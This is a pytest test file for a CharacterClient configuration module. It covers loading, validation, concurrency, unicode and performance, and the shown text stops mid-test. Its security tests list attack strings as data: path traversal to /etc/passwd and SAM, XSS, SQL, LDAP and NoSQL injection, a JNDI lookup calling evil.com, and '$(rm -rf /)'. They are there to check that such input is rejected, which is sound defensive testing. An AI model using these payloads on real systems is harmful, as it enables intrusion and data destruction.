import pytest
import os
import tempfile
import json
import yaml
from unittest.mock import patch, mock_open, MagicMock
from pathlib import Path

# Import the config module being tested
try:
    from CharacterClient.config import Config, ConfigError, load_config, validate_config
except ImportError:
    # Handle case where config module structure might be different
    try:
        from CharacterClient import config
        Config = getattr(config, 'Config', None)
        ConfigError = getattr(config, 'ConfigError', Exception)
        load_config = getattr(config, 'load_config', None)
        validate_config = getattr(config, 'validate_config', None)
    except ImportError:
        # Fallback for different import structures
        import sys
        sys.path.append('CharacterClient')
        import config
        Config = getattr(config, 'Config', None)
        ConfigError = getattr(config, 'ConfigError', Exception)
        load_config = getattr(config, 'load_config', None)
        validate_config = getattr(config, 'validate_config', None)


class TestConfig:
    """Comprehensive test suite for Config functionality."""
    
    def setup_method(self):
        """Set up test fixtures before each test method."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = os.path.join(self.temp_dir, 'test_config.json')
        self.yaml_config_path = os.path.join(self.temp_dir, 'test_config.yaml')
        
        # Default valid configuration for testing
        self.valid_config = {
            'api_key': 'test_api_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False,
            'character_settings': {
                'default_name': 'TestCharacter',
                'max_characters': 100,
                'allowed_types': ['warrior', 'mage', 'rogue']
            }
        }
        
    def teardown_method(self):
        """Clean up after each test method."""
        import shutil
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def test_config_creation_with_valid_data(self):
        """Test Config object creation with valid configuration data."""
        if Config:
            config = Config(self.valid_config)
            assert config is not None
            assert hasattr(config, 'api_key') or 'api_key' in config
    
    def test_config_creation_with_empty_data(self):
        """Test Config object creation with empty configuration data."""
        if Config:
            with pytest.raises((ValueError, ConfigError, KeyError)):
                Config({})
    
    def test_config_creation_with_none(self):
        """Test Config object creation with None."""
        if Config:
            with pytest.raises((ValueError, ConfigError, TypeError)):
                Config(None)
    
    def test_config_creation_with_invalid_types(self):
        """Test Config object creation with invalid data types."""
        if Config:
            invalid_configs = [
                {'timeout': 'not_a_number'},
                {'max_retries': -1},
                {'debug': 'not_a_boolean'},
                {'character_settings': 'not_a_dict'}
            ]
            
            for invalid_config in invalid_configs:
                combined_config = {**self.valid_config, **invalid_config}
                with pytest.raises((ValueError, ConfigError, TypeError)):
                    Config(combined_config)
    
    def test_load_config_from_json_file(self):
        """Test loading configuration from a JSON file."""
        if load_config:
            # Create a test JSON config file
            with open(self.config_path, 'w') as f:
                json.dump(self.valid_config, f)
            
            config = load_config(self.config_path)
            assert config is not None
            assert config.get('api_key') == 'test_api_key_123'
    
    def test_load_config_from_yaml_file(self):
        """Test loading configuration from a YAML file."""
        if load_config:
            # Create a test YAML config file
            with open(self.yaml_config_path, 'w') as f:
                yaml.dump(self.valid_config, f)
            
            config = load_config(self.yaml_config_path)
            assert config is not None
            assert config.get('api_key') == 'test_api_key_123'
    
    def test_load_config_file_not_found(self):
        """Test loading configuration from non-existent file."""
        if load_config:
            with pytest.raises((FileNotFoundError, ConfigError, IOError)):
                load_config('/non/existent/path/config.json')
    
    def test_load_config_invalid_json(self):
        """Test loading configuration from invalid JSON file."""
        if load_config:
            # Create invalid JSON file
            with open(self.config_path, 'w') as f:
                f.write('{ invalid json content }')
            
            with pytest.raises((json.JSONDecodeError, ConfigError, ValueError)):
                load_config(self.config_path)
    
    def test_load_config_invalid_yaml(self):
        """Test loading configuration from invalid YAML file."""
        if load_config:
            # Create invalid YAML file
            with open(self.yaml_config_path, 'w') as f:
                f.write('invalid: yaml: content: [')
            
            with pytest.raises((yaml.YAMLError, ConfigError, ValueError)):
                load_config(self.yaml_config_path)
    
    def test_validate_config_with_valid_data(self):
        """Test configuration validation with valid data."""
        if validate_config:
            result = validate_config(self.valid_config)
            assert result is True or result is None  # Different implementations may return different values
    
    def test_validate_config_missing_required_fields(self):
        """Test configuration validation with missing required fields."""
        if validate_config:
            incomplete_configs = [
                {'api_key': 'test'},  # Missing other required fields
                {'base_url': 'https://api.example.com'},  # Missing api_key
                {}  # Empty config
            ]
            
            for incomplete_config in incomplete_configs:
                with pytest.raises((ValueError, ConfigError, KeyError)):
                    validate_config(incomplete_config)
    
    def test_validate_config_with_extra_fields(self):
        """Test configuration validation with extra unknown fields."""
        if validate_config:
            config_with_extra = {**self.valid_config, 'unknown_field': 'value'}
            # This should either pass (ignoring extra fields) or raise a specific error
            try:
                result = validate_config(config_with_extra)
                assert result is True or result is None
            except (ValueError, ConfigError):
                # Some implementations may reject unknown fields
                pass
    
    @patch.dict(os.environ, {'CHARACTER_API_KEY': 'env_api_key'})
    def test_config_from_environment_variables(self):
        """Test configuration loading from environment variables."""
        if Config:
            # Test that config can be loaded from environment variables
            env_config = {
                'api_key': os.environ.get('CHARACTER_API_KEY'),
                'base_url': 'https://api.example.com',
                'timeout': 30,
                'max_retries': 3,
                'debug': False,
                'character_settings': {}
            }
            
            config = Config(env_config)
            assert config is not None
    
    def test_config_default_values(self):
        """Test that configuration provides sensible default values."""
        if Config:
            minimal_config = {'api_key': 'test_key'}
            config = Config(minimal_config)
            
            # Test that defaults are applied appropriately
            # This test assumes the config system provides defaults
            assert config is not None
    
    def test_config_serialization(self):
        """Test configuration object serialization."""
        if Config:
            config = Config(self.valid_config)
            
            # Test various serialization methods that might exist
            try:
                serialized = str(config)
                assert serialized is not None
            except:
                pass
            
            try:
                dict_repr = dict(config) if hasattr(config, '__iter__') else vars(config)
                assert dict_repr is not None
            except:
                pass
    
    def test_config_immutability(self):
        """Test that configuration objects are immutable where expected."""
        if Config:
            config = Config(self.valid_config)
            
            # Try to modify the config and ensure it's protected
            try:
                if hasattr(config, 'api_key'):
                    original_key = config.api_key
                    config.api_key = 'modified_key'
                    # If modification succeeded, verify it was intended
                    assert config.api_key == 'modified_key' or config.api_key == original_key
            except (AttributeError, TypeError):
                # Expected if config is immutable
                pass
    
    def test_config_nested_access(self):
        """Test accessing nested configuration values."""
        if Config:
            config = Config(self.valid_config)
            
            # Test nested access patterns
            try:
                if hasattr(config, 'character_settings'):
                    assert config.character_settings is not None
                elif 'character_settings' in config:
                    assert config['character_settings'] is not None
            except (KeyError, AttributeError):
                # May not have nested access implemented
                pass
    
    def test_config_validation_edge_cases(self):
        """Test configuration validation with edge cases."""
        if validate_config:
            edge_cases = [
                {'api_key': ''},  # Empty string
                {'api_key': ' ' * 100},  # Very long string
                {'timeout': 0},  # Zero timeout
                {'timeout': 999999},  # Very large timeout
                {'max_retries': 0},  # Zero retries
                {'character_settings': {}},  # Empty nested dict
            ]
            
            for edge_case in edge_cases:
                test_config = {**self.valid_config, **edge_case}
                try:
                    validate_config(test_config)
                except (ValueError, ConfigError):
                    # Some edge cases may be invalid
                    pass
    
    def test_config_thread_safety(self):
        """Test configuration object thread safety."""
        if Config:
            import threading
            import time
            
            config = Config(self.valid_config)
            results = []
            
            def access_config():
                try:
                    # Access config properties multiple times
                    for _ in range(10):
                        if hasattr(config, 'api_key'):
                            val = config.api_key
                        elif 'api_key' in config:
                            val = config['api_key']
                        results.append(True)
                        time.sleep(0.001)  # Small delay
                except Exception as e:
                    results.append(False)
            
            # Create multiple threads accessing the config
            threads = [threading.Thread(target=access_config) for _ in range(5)]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            
            # All accesses should succeed
            assert all(results)
    
    @patch('builtins.open', mock_open(read_data='{"api_key": "mocked_key"}'))
    def test_config_loading_with_mocked_file(self):
        """Test configuration loading with mocked file operations."""
        if load_config:
            config = load_config('mocked_path.json')
            assert config is not None
            assert config.get('api_key') == 'mocked_key'
    
    def test_config_error_handling(self):
        """Test proper error handling and error messages."""
        if ConfigError:
            # Test that ConfigError can be raised and caught
            with pytest.raises(ConfigError):
                raise ConfigError("Test error message")
    
    def test_config_backward_compatibility(self):
        """Test backward compatibility with older config formats."""
        if Config:
            # Test with minimal old-style config
            old_style_config = {
                'api_key': 'old_key',
                'url': 'https://old-api.example.com'  # Different key name
            }
            
            try:
                config = Config(old_style_config)
                assert config is not None
            except (ValueError, ConfigError, KeyError):
                # Expected if backward compatibility isn't maintained
                pass
    
    def test_config_performance(self):
        """Test configuration loading and access performance."""
        if Config:
            import time
            
            # Test config creation performance
            start_time = time.time()
            for _ in range(100):
                config = Config(self.valid_config)
            creation_time = time.time() - start_time
            
            # Should be reasonably fast (less than 1 second for 100 creations)
            assert creation_time < 1.0
            
            # Test config access performance
            config = Config(self.valid_config)
            start_time = time.time()
            for _ in range(1000):
                if hasattr(config, 'api_key'):
                    val = config.api_key
                elif 'api_key' in config:
                    val = config['api_key']
            access_time = time.time() - start_time
            
            # Should be very fast (less than 0.1 seconds for 1000 accesses)
            assert access_time < 0.1


class TestConfigIntegration:
    """Integration tests for Config functionality."""
    
    def test_config_with_real_file_system(self):
        """Test configuration with actual file system operations."""
        if load_config:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': 'integration_test_key'}, f)
                temp_path = f.name
            
            try:
                config = load_config(temp_path)
                assert config is not None
                assert config.get('api_key') == 'integration_test_key'
            finally:
                os.unlink(temp_path)
    
    def test_config_with_environment_integration(self):
        """Test configuration integration with environment variables."""
        if Config:
            # Test environment variable precedence
            with patch.dict(os.environ, {'CONFIG_DEBUG': 'true'}):
                config_data = {'api_key': 'test', 'debug': False}
                config = Config(config_data)
                # Test if environment variables override config file values
                assert config is not None


class TestConfigSecurity:
    """Security-focused tests for configuration handling."""
    
    def test_config_sensitive_data_handling(self):
        """Test that sensitive configuration data is handled securely."""
        if Config:
            sensitive_config = {
                'api_key': 'super_secret_key',
                'password': 'secret_password',
                'token': 'auth_token_123'
            }
            
            config = Config(sensitive_config)
            
            # Test that sensitive data doesn't appear in string representations
            config_str = str(config)
            assert 'super_secret_key' not in config_str
            assert 'secret_password' not in config_str
    
    def test_config_path_traversal_protection(self):
        """Test protection against path traversal attacks in config file loading."""
        if load_config:
            malicious_paths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM'
            ]
            
            for malicious_path in malicious_paths:
                with pytest.raises((FileNotFoundError, PermissionError, ValueError, ConfigError)):
                    load_config(malicious_path)


class TestConfigValidation:
    """Comprehensive validation tests for configuration data."""
    
    def test_url_validation(self):
        """Test URL validation in configuration."""
        if validate_config or Config:
            invalid_urls = [
                'not_a_url',
                'http://',
                'ftp://invalid',
                'javascript:alert(1)',
                'file:///etc/passwd'
            ]
            
            for invalid_url in invalid_urls:
                invalid_config = {'api_key': 'test', 'base_url': invalid_url}
                
                if validate_config:
                    with pytest.raises((ValueError, ConfigError)):
                        validate_config(invalid_config)
                elif Config:
                    with pytest.raises((ValueError, ConfigError)):
                        Config(invalid_config)
    
    def test_numeric_range_validation(self):
        """Test numeric range validation for configuration values."""
        if validate_config or Config:
            test_cases = [
                ('timeout', -1, False),  # Negative timeout should be invalid
                ('timeout', 0, False),   # Zero timeout should be invalid
                ('timeout', 1, True),    # Positive timeout should be valid
                ('max_retries', -1, False),  # Negative retries should be invalid
                ('max_retries', 0, True),    # Zero retries might be valid
                ('max_retries', 100, True),  # Large retries should be valid
            ]
            
            base_config = {'api_key': 'test', 'base_url': 'https://api.example.com'}
            
            for field, value, should_be_valid in test_cases:
                test_config = {**base_config, field: value}
                
                if should_be_valid:
                    try:
                        if validate_config:
                            validate_config(test_config)
                        elif Config:
                            Config(test_config)
                    except (ValueError, ConfigError):
                        pytest.fail(f"Valid {field}={value} was rejected")
                else:
                    with pytest.raises((ValueError, ConfigError)):
                        if validate_config:
                            validate_config(test_config)
                        elif Config:
                            Config(test_config)


# Additional parametrized tests for comprehensive coverage
@pytest.mark.parametrize("config_format", ["json", "yaml"])
def test_config_loading_different_formats(config_format):
    """Test configuration loading with different file formats."""
    if not load_config:
        pytest.skip("load_config function not available")
    
    config_data = {'api_key': 'format_test_key'}
    
    with tempfile.NamedTemporaryFile(mode='w', suffix=f'.{config_format}', delete=False) as f:
        if config_format == 'json':
            json.dump(config_data, f)
        elif config_format == 'yaml':
            yaml.dump(config_data, f)
        temp_path = f.name
    
    try:
        config = load_config(temp_path)
        assert config is not None
        assert config.get('api_key') == 'format_test_key'
    finally:
        os.unlink(temp_path)


@pytest.mark.parametrize("invalid_value", [None, "", "   ", 123, [], {}])
def test_config_validation_invalid_api_keys(invalid_value):
    """Test configuration validation with various invalid API key values."""
    if not validate_config:
        pytest.skip("validate_config function not available")
    
    config_data = {
        'api_key': invalid_value,
        'base_url': 'https://api.example.com'
    }
    
    with pytest.raises((ValueError, ConfigError, TypeError)):
        validate_config(config_data)


@pytest.mark.parametrize("timeout_value", [-1, 0, 1, 30, 300, 999999])
def test_config_timeout_boundary_values(timeout_value):
    """Test configuration with various timeout boundary values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        'timeout': timeout_value
    }
    
    if timeout_value < 1:
        with pytest.raises((ValueError, ConfigError)):
            Config(config_data)
    else:
        config = Config(config_data)
        assert config is not None


@pytest.mark.parametrize("debug_value", [True, False, "true", "false", 1, 0, "yes", "no"])
def test_config_debug_flag_values(debug_value):
    """Test configuration with various debug flag values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        'debug': debug_value
    }
    
    try:
        config = Config(config_data)
        assert config is not None
    except (ValueError, ConfigError, TypeError):
        # Some debug values might be invalid depending on implementation
        pass


class TestConfigConcurrency:
    """Tests for configuration handling under concurrent access."""
    
    def test_config_multiple_readers(self):
        """Test configuration with multiple concurrent readers."""
        if not Config:
            pytest.skip("Config class not available")
        
        import threading
        import time
        
        config_data = {'api_key': 'concurrent_test_key'}
        config = Config(config_data)
        
        results = []
        errors = []
        
        def read_config():
            try:
                for _ in range(50):
                    if hasattr(config, 'api_key'):
                        value = config.api_key
                    elif 'api_key' in config:
                        value = config['api_key']
                    results.append(value)
                    time.sleep(0.001)
            except Exception as e:
                errors.append(e)
        
        # Create multiple reader threads
        threads = [threading.Thread(target=read_config) for _ in range(10)]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All reads should succeed without errors
        assert len(errors) == 0
        assert len(results) > 0
    
    def test_config_loading_concurrent_files(self):
        """Test loading configuration from multiple files concurrently."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        import threading
        
        # Create multiple temporary config files
        temp_files = []
        for i in range(5):
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump({'api_key': f'test_key_{i}'}, f)
                temp_files.append(f.name)
        
        results = []
        errors = []
        
        def load_config_file(filepath):
            try:
                config = load_config(filepath)
                results.append(config)
            except Exception as e:
                errors.append(e)
        
        # Load configs concurrently
        threads = [threading.Thread(target=load_config_file, args=(path,)) for path in temp_files]
        
        for thread in threads:
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Clean up temporary files
        for temp_file in temp_files:
            os.unlink(temp_file)
        
        # All loads should succeed
        assert len(errors) == 0
        assert len(results) == 5


# Edge case tests for robustness
class TestConfigEdgeCases:
    """Edge case tests for configuration handling."""
    
    def test_config_with_unicode_values(self):
        """Test configuration with Unicode values."""
        if not Config:
            pytest.skip("Config class not available")
        
        unicode_config = {
            'api_key': 'тест_ключ_🔑',
            'base_url': 'https://测试.example.com',
            'debug': False
        }
        
        config = Config(unicode_config)
        assert config is not None
    
    def test_config_with_very_long_values(self):
        """Test configuration with very long string values."""
        if not Config:
            pytest.skip("Config class not available")
        
        long_string = 'x' * 10000
        long_config = {
            'api_key': long_string,
            'base_url': 'https://api.example.com'
        }
        
        try:
            config = Config(long_config)
            assert config is not None
        except (ValueError, ConfigError, MemoryError):
            # Some implementations may reject very long values
            pass
    
    def test_config_with_deeply_nested_data(self):
        """Test configuration with deeply nested data structures."""
        if not Config:
            pytest.skip("Config class not available")
        
        nested_config = {
            'api_key': 'test_key',
            'level1': {
                'level2': {
                    'level3': {
                        'level4': {
                            'level5': {
                                'deep_value': 'found_me'
                            }
                        }
                    }
                }
            }
        }
        
        config = Config(nested_config)
        assert config is not None
    
    def test_config_with_circular_references(self):
        """Test configuration handling with circular references."""
        if not Config:
            pytest.skip("Config class not available")
        
        # Create a structure with circular reference
        circular_dict = {'api_key': 'test_key'}
        circular_dict['self_ref'] = circular_dict
        
        with pytest.raises((ValueError, ConfigError, RecursionError)):
            Config(circular_dict)


# Performance benchmarks
class TestConfigPerformance:
    """Performance tests for configuration operations."""
    
    def test_config_creation_performance_benchmark(self):
        """Benchmark configuration object creation performance."""
        if not Config:
            pytest.skip("Config class not available")
        
        import time
        
        config_data = {
            'api_key': 'performance_test_key',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
        
        # Warm up
        for _ in range(10):
            Config(config_data)
        
        # Benchmark
        start_time = time.time()
        iterations = 1000
        
        for _ in range(iterations):
            Config(config_data)
        
        end_time = time.time()
        total_time = end_time - start_time
        avg_time = total_time / iterations
        
        # Should create configs quickly (less than 1ms per config on average)
        assert avg_time < 0.001, f"Config creation too slow: {avg_time:.4f}s per config"
    
    def test_config_file_loading_performance(self):
        """Benchmark configuration file loading performance."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        import time
        
        # Create a reasonably sized config file
        large_config = {
            'api_key': 'performance_test_key',
            'base_url': 'https://api.example.com',
            'settings': {f'setting_{i}': f'value_{i}' for i in range(100)}
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(large_config, f)
            temp_path = f.name
        
        try:
            # Warm up
            for _ in range(5):
                load_config(temp_path)
            
            # Benchmark
            start_time = time.time()
            iterations = 100
            
            for _ in range(iterations):
                load_config(temp_path)
            
            end_time = time.time()
            total_time = end_time - start_time
            avg_time = total_time / iterations
            
            # Should load configs quickly (less than 10ms per load on average)
            assert avg_time < 0.01, f"Config loading too slow: {avg_time:.4f}s per load"
        
        finally:
            os.unlink(temp_path)

# Additional comprehensive test classes for enhanced coverage
class TestConfigAdvancedValidation:
    """Advanced validation tests for configuration handling."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.base_config = {
            'api_key': 'test_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
    
    def test_config_schema_validation_strict_mode(self):
        """Test configuration validation in strict mode."""
        if validate_config:
            extra_fields_config = {
                **self.base_config,
                'unknown_field': 'should_fail_in_strict_mode',
                'another_unknown': 123
            }
            
            # Try validation with potential strict mode
            try:
                result = validate_config(extra_fields_config)
                assert result is not False
            except (ValueError, ConfigError):
                # Expected in strict mode implementations
                pass
    
    def test_config_type_coercion_scenarios(self):
        """Test automatic type coercion in configuration."""
        if Config:
            type_coercion_cases = [
                ({'timeout': '30'}, 'timeout', int),  # String to int
                ({'debug': 'true'}, 'debug', bool),   # String to bool
                ({'debug': 1}, 'debug', bool),        # Int to bool
                ({'max_retries': '5'}, 'max_retries', int), # String to int
                ({'timeout': 30.5}, 'timeout', (int, float)), # Float handling
            ]
            
            for test_overrides, field, expected_type in type_coercion_cases:
                test_config = {**self.base_config, **test_overrides}
                try:
                    config = Config(test_config)
                    assert config is not None
                    
                    # Verify type coercion if accessible
                    if hasattr(config, field):
                        value = getattr(config, field)
                        if isinstance(expected_type, tuple):
                            assert isinstance(value, expected_type)
                        else:
                            assert isinstance(value, expected_type)
                    elif isinstance(config, dict) and field in config:
                        value = config[field]
                        if isinstance(expected_type, tuple):
                            assert isinstance(value, expected_type)
                        else:
                            assert isinstance(value, expected_type)
                            
                except (ValueError, ConfigError, TypeError):
                    # Type coercion might not be supported
                    pass
    
    def test_config_conditional_validation_rules(self):
        """Test conditional validation rules between fields."""
        if validate_config or Config:
            conditional_cases = [
                # If debug is True, certain fields might be required
                {'debug': True, 'log_level': 'info'},
                # SSL configuration dependencies
                {'ssl_enabled': True, 'ssl_cert_path': '/path/to/cert'},
                # Authentication dependencies
                {'auth_type': 'oauth', 'oauth_client_id': 'client123'},
                # Rate limiting configuration
                {'rate_limit_enabled': True, 'rate_limit_per_minute': 100},
            ]
            
            for case in conditional_cases:
                test_config = {**self.base_config, **case}
                try:
                    if validate_config:
                        result = validate_config(test_config)
                        assert result is not False
                    elif Config:
                        config = Config(test_config)
                        assert config is not None
                except (ValueError, ConfigError, KeyError):
                    # Conditional validation might reject incomplete configs
                    pass
    
    def test_config_numeric_range_validation(self):
        """Test comprehensive numeric range validation."""
        if validate_config or Config:
            range_test_cases = [
                ('timeout', 0.001, True),   # Very small positive timeout
                ('timeout', 0.1, True),     # Fractional timeout
                ('timeout', 3600, True),    # 1 hour timeout
                ('timeout', 86400, False),  # 24 hour timeout (likely invalid)
                ('max_retries', 0, True),   # Zero retries might be valid
                ('max_retries', 1, True),   # Minimum retries
                ('max_retries', 100, True), # High retry count
                ('max_retries', 10000, False), # Excessive retry count
                ('port', 1, True),          # Minimum valid port
                ('port', 65535, True),      # Maximum valid port
                ('port', 65536, False),     # Invalid port
                ('port', -1, False),        # Negative port
            ]
            
            for field, value, should_be_valid in range_test_cases:
                test_config = {**self.base_config, field: value}
                
                try:
                    if validate_config:
                        validate_config(test_config)
                    elif Config:
                        Config(test_config)
                    
                    if not should_be_valid:
                        pytest.fail(f"Expected {field}={value} to be invalid but was accepted")
                except (ValueError, ConfigError, TypeError):
                    if should_be_valid:
                        pytest.fail(f"Expected {field}={value} to be valid but was rejected")
    
    def test_config_string_pattern_validation(self):
        """Test pattern-based validation for string fields."""
        if validate_config or Config:
            pattern_cases = [
                # API key patterns
                ('api_key', 'ak-' + 'x' * 32, True),
                ('api_key', 'sk-' + 'x' * 48, True),
                ('api_key', 'invalid_format', False),
                ('api_key', '', False),
                
                # URL patterns
                ('base_url', 'https://api.example.com/v1', True),
                ('base_url', 'http://localhost:8080', True),
                ('base_url', 'https://subdomain.api.example.com', True),
                ('base_url', 'invalid-protocol://example.com', False),
                ('base_url', 'not_a_url', False),
                
                # Version patterns
                ('version', '1.0.0', True),
                ('version', 'v2.1.3-beta', True),
                ('version', '0.0.1-alpha.1', True),
                ('version', 'invalid.version', False),
                ('version', 'not_semver', False),
            ]
            
            for field, value, should_be_valid in pattern_cases:
                test_config = {**self.base_config, field: value}
                
                try:
                    if validate_config:
                        validate_config(test_config)
                    elif Config:
                        Config(test_config)
                    
                    if not should_be_valid:
                        pytest.fail(f"Expected {field}={value} to be invalid but was accepted")
                except (ValueError, ConfigError):
                    if should_be_valid:
                        pytest.fail(f"Expected {field}={value} to be valid but was rejected")


class TestConfigInternationalization:
    """Tests for internationalization and encoding support."""
    
    def test_config_unicode_character_sets(self):
        """Test configuration with various Unicode character sets."""
        if Config:
            unicode_test_cases = [
                {'api_key': 'ключ_тест_🔑', 'description': 'Русский текст'},
                {'api_key': 'テストキー', 'description': '日本語のテスト'},
                {'api_key': 'مفتاح_اختبار', 'description': 'النص العربي'},
                {'api_key': '测试密钥', 'description': '中文测试'},
                {'api_key': 'café_münü_naïve', 'description': 'Accented characters'},
                {'api_key': '🌍🔑🚀💻', 'description': 'Emoji characters'},
            ]
            
            for unicode_config in unicode_test_cases:
                test_config = {**self.base_config, **unicode_config}
                try:
                    config = Config(test_config)
                    assert config is not None
                    
                    # Verify Unicode preservation in string representation
                    config_str = str(config)
                    assert len(config_str) > 0
                    
                except (ValueError, ConfigError, UnicodeError):
                    # Some implementations might not support all Unicode
                    pass
    
    def test_config_encoding_variations(self):
        """Test configuration with different text encodings."""
        if load_config:
            # Test various encodings
            encoding_tests = [
                ('utf-8', {'api_key': 'тест_ключ_🌍', 'debug': True}),
                ('utf-16', {'api_key': 'test_key_utf16', 'debug': False}),
                ('latin1', {'api_key': 'test_key_latin1', 'debug': True}),
            ]
            
            for encoding, config_data in encoding_tests:
                try:
                    with tempfile.NamedTemporaryFile(mode='w', encoding=encoding, suffix='.json', delete=False) as f:
                        json.dump(config_data, f, ensure_ascii=False)
                        temp_path = f.name
                    
                    try:
                        config = load_config(temp_path)
                        assert config is not None
                        assert config.get('api_key') is not None
                    except (UnicodeError, ConfigError):
                        # Encoding issues might occur with some implementations
                        pass
                    finally:
                        os.unlink(temp_path)
                        
                except (UnicodeEncodeError, LookupError):
                    # Some encodings might not support certain characters
                    pass
    
    def test_config_normalization(self):
        """Test Unicode normalization in configuration values."""
        if Config:
            # Test different Unicode normalization forms
            normalization_cases = [
                'café',      # NFC form
                'cafe\u0301', # NFD form (e + combining acute accent)
                'naïve',     # NFC form  
                'nai\u0308ve', # NFD form (i + combining diaeresis)
            ]
            
            for test_value in normalization_cases:
                test_config = {**self.base_config, 'description': test_value}
                try:
                    config = Config(test_config)
                    assert config is not None
                except (ValueError, ConfigError, UnicodeError):
                    # Normalization handling varies by implementation
                    pass


class TestConfigExtensibility:
    """Tests for configuration system extensibility features."""
    
    def test_config_plugin_architecture(self):
        """Test configuration support for plugin architecture."""
        if Config:
            plugin_config = {
                **self.base_config,
                'plugins': {
                    'authentication': {
                        'enabled': True,
                        'type': 'oauth2',
                        'config': {
                            'client_id': 'test_client',
                            'scopes': ['read', 'write']
                        }
                    },
                    'logging': {
                        'enabled': True,
                        'type': 'structured',
                        'config': {
                            'format': 'json',
                            'level': 'info'
                        }
                    },
                    'caching': {
                        'enabled': False,
                        'type': 'redis',
                        'config': {
                            'host': 'localhost',
                            'port': 6379
                        }
                    }
                }
            }
            
            try:
                config = Config(plugin_config)
                assert config is not None
                
                # Test plugin configuration access if supported
                if hasattr(config, 'plugins') or 'plugins' in config:
                    # Verify plugin structure is preserved
                    pass
                    
            except (ValueError, ConfigError):
                # Plugin architecture might not be supported
                pass
    
    def setup_method(self):
        """Set up test fixtures."""
        self.base_config = {
            'api_key': 'test_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
    
    def test_config_inheritance_patterns(self):
        """Test configuration inheritance and composition patterns."""
        if Config:
            base_config = {
                'api_key': 'base_key',
                'base_url': 'https://api.example.com',
                'timeout': 30,
                'common_settings': {
                    'retry_strategy': 'exponential',
                    'user_agent': 'CharacterClient/1.0'
                }
            }
            
            derived_configs = [
                {
                    **base_config,
                    'api_key': 'derived_key',
                    'environment': 'development',
                    'debug': True
                },
                {
                    **base_config,
                    'api_key': 'prod_key',
                    'environment': 'production',
                    'timeout': 60,
                    'debug': False
                }
            ]
            
            for derived_config in derived_configs:
                try:
                    config = Config(derived_config)
                    assert config is not None
                    
                    # Verify inheritance worked correctly
                    if hasattr(config, 'common_settings') or 'common_settings' in config:
                        # Common settings should be inherited
                        pass
                        
                except (ValueError, ConfigError):
                    # Inheritance might not be supported
                    pass
    
    def test_config_composition_and_merging(self):
        """Test configuration composition from multiple sources."""
        if Config:
            config_fragments = [
                {'api_key': 'fragment_key'},
                {'base_url': 'https://api.example.com', 'timeout': 30},
                {'debug': True, 'log_level': 'debug'},
                {'features': {'feature_a': True, 'feature_b': False}}
            ]
            
            # Test merging configurations
            merged_config = {}
            for fragment in config_fragments:
                merged_config.update(fragment)
            
            try:
                config = Config(merged_config)
                assert config is not None
                
                # Verify all fragments were merged
                assert merged_config.get('api_key') == 'fragment_key'
                assert merged_config.get('base_url') is not None
                assert merged_config.get('debug') is True
                
            except (ValueError, ConfigError):
                # Merging might fail due to validation rules
                pass


class TestConfigSecurityHardening:
    """Enhanced security tests for configuration handling."""
    
    def test_config_injection_attack_prevention(self):
        """Test prevention of various injection attacks through config."""
        if Config:
            injection_test_cases = [
                # Script injection attempts
                {'description': '<script>alert("xss")</script>'},
                {'api_key': 'key"; DROP TABLE users; --'},
                {'base_url': 'javascript:alert(document.cookie)'},
                
                # Template injection attempts  
                {'template': '{{config.__class__.__init__.__globals__}}'},
                {'template': '${jndi:ldap://evil.com/exploit}'},
                {'template': '#{7*7}'},
                
                # Command injection attempts
                {'command': '$(rm -rf /)'},
                {'path': '../../../etc/passwd'},
                {'filename': '../../sensitive_file.txt'},
                
                # LDAP injection attempts
                {'filter': '*)(&(objectClass=user)(cn=*'},
                {'username': 'admin)(&(password=*))(|'},
                
                # NoSQL injection attempts
                {'query': "'; return db.users.find(); var dummy='"},
                {'filter': {'$where': 'this.username == "admin"'}},
            ]
            
            for malicious_config in injection_test_cases:
                test_config = {**self.base_config, **malicious_config}
                
                try:
                    config = Config(test_config)
                    
                    # Verify malicious content is sanitized in string representations
                    config_str = str(config)
                    config_repr = repr(config)
                    
                    # Check for dangerous patterns in output
                    dangerous_patterns = [
                        '<script>', 'javascript:', 'DROP TABLE', '${jndi:',
                        '$(', '../', '../../', '__globals__', 'rm -rf'
                    ]
                    
                    for pattern in dangerous_patterns:
                        assert pattern not in config_str, f"Dangerous pattern '{pattern}' found in config string"
                        assert pattern not in config_repr, f"Dangerous pattern '{pattern}' found in config repr"
                        
                except (ValueError, ConfigError):
                    # Expected - malicious input should be rejected
                    pass
    
    def test_config_sensitive_data_protection(self):
        """Test comprehensive protection of sensitive configuration data."""
        if Config:
            sensitive_field_tests = [
                ('api_key', 'very_secret_api_key_123'),
                ('password', 'super_secret_password'),
                ('token', 'bearer_token_xyz'),
                ('secret', 'application_secret'),
                ('private_key', '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG...'),
                ('access_token', 'oauth_access_token_456'),
                ('refresh_token', 'oauth_refresh_token_789'),
                ('api_secret', 'api_secret_value'),
                ('client_secret', 'oauth_client_secret'),
                ('encryption_key', 'aes_encryption_key_256bit'),
            ]
            
            for field_name, secret_value in sensitive_field_tests:
                config_data = {**self.base_config, field_name: secret_value}
                
                try:
                    config = Config(config_data)
                    
                    # Test various string representations
                    representations = [
                        str(config),
                        repr(config),
                    ]
                    
